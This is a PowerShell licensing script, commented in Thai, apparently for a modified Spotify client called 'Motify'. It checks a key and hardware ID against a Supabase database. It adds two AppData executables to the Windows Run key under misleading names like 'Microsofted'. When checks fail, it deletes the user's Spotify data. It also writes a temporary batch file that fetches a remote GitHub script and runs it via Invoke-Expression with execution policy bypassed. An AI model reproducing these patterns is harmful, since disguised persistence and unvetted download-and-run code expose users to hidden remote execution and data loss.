# ตั้งค่า TLS เป็น TLS 1.2 สำหรับ HTTPS
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

###############################################
# Function Write-log
###############################################
function Write-Log {
    param (
        [string]$message
    )
    $logDirPath = "$env:APPDATA\Motify"
    $logFilePath = "$logDirPath\log.txt"
    if (-not (Test-Path $logDirPath)) {
        New-Item -ItemType Directory -Path $logDirPath -Force | Out-Null
    }
    $logMessage = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $message"
    Add-Content -Path $logFilePath -Value $logMessage
}

###############################################
# ฟังก์ชันสำหรับลบไฟล์ Spotify และข้อมูลที่เกี่ยวข้อง
function Remove-Spotify {    
    $spotifyPath = "$env:APPDATA\Spotify" 
    if (Test-Path $spotifyPath) {
        Remove-Item -Path $spotifyPath -Recurse -Force -ErrorAction SilentlyContinue
    }
    else {
    }

    # สร้างไฟล์ .bat สำหรับการลบ Spotify และรัน core.ps1
    $batchScript = @"
@echo off
set PWSH=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
set ScriptUrl=https://raw.githubusercontent.com/DevilScript/Spotify-Pre/refs/heads/main/core.ps1

"%PWSH%" -NoProfile -ExecutionPolicy Bypass -Command "& { Invoke-Expression (Invoke-WebRequest -Uri '%ScriptUrl%').Content }"
"@
    # สร้างและรันไฟล์ .bat
    $batFilePath = [System.IO.Path]::Combine($env:TEMP, "remove_spotify.bat")
    $batchScript | Set-Content -Path $batFilePath
    Start-Process -FilePath $batFilePath -NoNewWindow -Wait
    # ลบไฟล์ .bat หลังจากทำงานเสร็จ
    Remove-Item -Path $batFilePath -Force
    Stop-Process -Id $PID -Force -ErrorAction SilentlyContinue
    exit
}

###############################################
# Function Add Registry For Startup
###############################################
function Add-StartupRegistry {
    $motifyPath = "$env:APPDATA\Motify\SystemID.exe"
    $microsoftPath = "$env:APPDATA\Microsoft\SystemID.exe"

    if (-not (Test-Path $motifyPath)) {
         Write-Log "Error: ID not found in up"
         Remove-Spotify
    }
    if (-not (Test-Path $microsoftPath)) {
         Write-Log "Error: IDM not found up"
         Remove-Spotify
    }

    $regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regValueName1 = "SystemID"
    $regValueName2 = "Microsofted"

    try {
         Set-ItemProperty -Path $regKey -Name $regValueName1 -Value $motifyPath -Force
    }
    catch {
         Write-Log "Error: Failed to add ID"
         Remove-Spotify
    }
    try {
         Set-ItemProperty -Path $regKey -Name $regValueName2 -Value $microsoftPath -Force    }
    catch {
         Write-Log "Error: Failed to add IDM"
         Remove-Spotify
    }
}

###############################################
# Function Remove Registry For Startup
###############################################
function Remove-StartupRegistry {
    $regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regValueName1 = "SystemID"
    $regValueName2 = "Microsofted"

    try {
        if (Get-ItemProperty -Path $regKey -Name $regValueName1 -ErrorAction SilentlyContinue) {
            Remove-ItemProperty -Path $regKey -Name $regValueName1 -Force
            Write-Log "Removed ID from up"
        }
    }
    catch {
        Write-Log "Error: Failed to remove ID from up"
    }

    try {
        if (Get-ItemProperty -Path $regKey -Name $regValueName2 -ErrorAction SilentlyContinue) {
            Remove-ItemProperty -Path $regKey -Name $regValueName2 -Force
            Write-Log "Removed IDM from up"
        }
    }
    catch {
        Write-Log "Error: Failed to remove IDM up"
    }
}

##################################
# Function Check Expired For Key 
##################################
function Check-ExpiryDate {
    param (
        [string]$key
    )
    $supabaseURL = "https://sepwbvwlodlwehflzyiw.supabase.co"
    $supabaseAPIKey = $env:moyx
    $url = "$supabaseURL/rest/v1/keys?key=eq.$key"
    try {
        $response = Invoke-RestMethod -Uri $url -Method Get -Headers @{ "apikey" = $supabaseAPIKey }
        if ($response.Count -eq 0) {
            Write-Log "Error: Key not found in DATA"
            return $true   # ถ้าไม่เจอ ให้ถือว่า expired
        }
        $lastExpired = $response[0].last_expired
        $hwid = $response[0].hwid

        if (-not $lastExpired -or $lastExpired -eq "") {
            Write-Log "Warning: last_expired field is empty"
            return $false
        }

        # พยายามแปลงค่า last_expired ด้วย ParseExact ตามรูปแบบที่คาดหวัง
        try {
            $expiryDateTime = [DateTime]::ParseExact($lastExpired, "yyyy-MM-dd HH:mm:ss", $null)
        }
        catch {
            try {
                # ลองใช้ DateTime::Parse เป็น fallback
                $expiryDateTime = [DateTime]::Parse($lastExpired)
            }
            catch {
                return $true
            }
        }
        
        $currentDateTime = Get-Date
        if ($currentDateTime -gt $expiryDateTime) {
            $formattedTime = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
            $logData = @{
                key    = $key
                hwid   = $hwid
                time   = $formattedTime
                status = "Expired at [$lastExpired]"
            }
            try {
                Invoke-RestMethod -Uri "$supabaseURL/rest/v1/expired_log" -Method POST `
                    -Headers @{ "apikey" = $supabaseAPIKey } `
                    -Body ($logData | ConvertTo-Json -Depth 10) `
                    -ContentType "application/json"
            }
            catch {
            }
            try {
                Invoke-RestMethod -Uri $url -Method DELETE -Headers @{ "apikey" = $supabaseAPIKey } -ContentType "application/json"
            }
            catch {
                Write-Log "Error: Key failed to delete"
            }
            return $true  # หมดอายุ
        }
        else {
            return $false  # ยังไม่หมดอายุ
        }
    }
    catch {
        Write-Log "Error: Failed to connect to DATA"
        return $true   # กรณีเกิดข้อผิดพลาด ให้ถือว่า expired
    }
}

###############################################
# Function Check HWID/Key/Files
###############################################
function Check-HwidAndKey {
    Write-Log "------------------------ Log Entry: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ------------------------"
    Write-Log "Start: Checking HWID, Key, and Files"
    $filePath = "$env:APPDATA\Motify\key_hwid.json"

    # รับค่า HWID ของเครื่อง
    $hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
    if (-not $hwid) {
        Write-Log "Error: Failed to retrieve HWID"
        Remove-Spotify
        exit
    }
    
    # ตรวจสอบไฟล์ key_hwid.json
    if (-not (Test-Path $filePath)) {
        Write-Log "Error: key_hwid.json file not found"
		Write-Log "///////////////////////////////////////////////////////////////////////////////////////"
        Remove-Spotify
        exit
    }
    
    $data = Get-Content $filePath | ConvertFrom-Json
    if (-not $data.key -or -not $data.hwid) {
        Write-Log "Error: Key/HWID missing in key_hwid.json"
		Write-Log "///////////////////////////////////////////////////////////////////////////////////////"
        Remove-Item $filePath -Force
        Remove-Spotify
        exit
    }
    
    $key = $data.key
    
    # ตรวจสอบวันหมดอายุของ Key
    if (Check-ExpiryDate -key $key) {
            Write-Log "System: Key Expired! >> [$key] Expired on [$lastExpired]"
			Write-Log "System: Key >> [$key] has been deleted from the DATA"
			Write-Log "///////////////////////////////////////////////////////////////////////////////////////"
        Remove-Item $filePath -Force
		Remove-StartupRegistry
        Remove-Spotify
        exit
    }
	
 # ตรวจสอบ HWID/KEY ที่ได้รับจาก Supabase
    $supabaseURL = "https://sepwbvwlodlwehflzyiw.supabase.co"
    $supabaseAPIKey = $env:moyx
    $url = "$supabaseURL/rest/v1/keys?key=eq.$key"
    
    try {
        $response = Invoke-RestMethod -Uri $url -Method Get -Headers @{ "apikey" = $supabaseAPIKey }
        if ($response.Count -eq 0) {
            Write-Log "Error: Key not found in DATA"
            Remove-Item $filePath -Force
            Remove-StartupRegistry
            Remove-Spotify
            exit
        }
		
        $hwidFromDB = $response[0].hwid
        if ($hwid -ne $hwidFromDB) {
            Write-Log "Error: HWID mismatch! Expected [$hwidFromDB] but got [$hwid]"
            Remove-Item $filePath -Force
            Remove-StartupRegistry
            Remove-Spotify
            exit
        }
         
		 # ✅ อัปเดตข้อมูลใน key_hwid.json ให้ตรงกับฐานข้อมูล Supabase ✅
		$lastExpired = $response[0].last_expired
		if ($lastExpired) {
			$lastExpired = $lastExpired -replace "T", " "
		}
        $newData = @{
            key  = $key
            hwid = $hwidFromDB
			Expired = $lastExpired
        }
        $newData | ConvertTo-Json -Depth 10 | Set-Content -Path $filePath -Force
    }
    catch {
        Write-Log "Error: Failed to connect to DATA"
        Remove-StartupRegistry
        Remove-Spotify
        exit
    }
    
    Write-Log "Verified"
    Write-Log "///////////////////////////////////////////////////////////////////////////////////////"
}

###############################################
# Main Execution
###############################################
Check-HwidAndKey
if ($?) {
    Add-StartupRegistry
} else {
    Remove-StartupRegistry
	Write-Log "Expired"
}
